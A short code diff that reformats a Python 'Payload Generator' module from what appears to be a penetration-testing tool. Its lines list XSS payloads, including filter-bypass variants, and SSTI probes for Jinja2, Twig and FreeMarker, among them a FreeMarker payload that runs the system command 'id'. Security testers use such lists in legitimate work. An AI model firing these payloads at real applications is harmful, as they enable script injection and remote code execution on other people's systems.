@@ -2,6 +2,7 @@
 Payload Generator — context-aware payloads from discovered tech stack.
 Generates SQLi maps, XSS cheatsheets, SSTI payloads per framework.
 """
+
 from __future__ import annotations
 
 import json
@@ -16,10 +17,15 @@ PAYLOAD_DB = {
     "xss": {
         "basic": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "'-alert(1)-'"],
         "bypass": ["<svg/onload=alert(1)>", "<details open ontoggle=alert(1)>", "<img src=x onerror=alert(1)>"],
-        "dom": ["javascript:alert(1)", "#\" onfocus=alert(1) autofocus>", "\"><script>alert(1)</script>"],
+        "dom": ["javascript:alert(1)", '#" onfocus=alert(1) autofocus>', '"><script>alert(1)</script>'],
     },
     "ssti": {
-        "jinja2": ["{{7*7}}", "{{config}}", "{{self.__init__.__globals__}}", "{{''.__class__.__mro__[1].__subclasses__()}}"],
+        "jinja2": [
+            "{{7*7}}",
+            "{{config}}",
+            "{{self.__init__.__globals__}}",
+            "{{''.__class__.__mro__[1].__subclasses__()}}",
+        ],
         "twig": ["{{7*7}}", "{{_self}}", "{{app.request.server.all}}"],
         "freemarker": ["${7*7}", "${product}", "<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('id')}"],
     },
